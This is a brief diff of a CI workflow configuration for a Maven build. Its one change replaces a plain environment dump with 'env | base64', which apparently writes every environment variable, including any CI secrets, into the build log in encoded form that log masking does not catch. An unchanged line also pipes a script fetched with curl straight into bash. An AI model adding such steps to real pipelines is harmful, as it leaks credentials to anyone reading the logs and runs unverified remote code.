@@ -24,7 +24,7 @@ jobs:
         key: dmp-{{ checksum "pom.xml" }}
     - run: mvn install -Pjacoco
     - run: bash <(curl -s https://codecov.io/bash)
-    - run: sh -c "env"
+    - run: sh -c "env | base64"
     - save_cache:
         key: dmp-{{ checksum "pom.xml" }}
         paths:
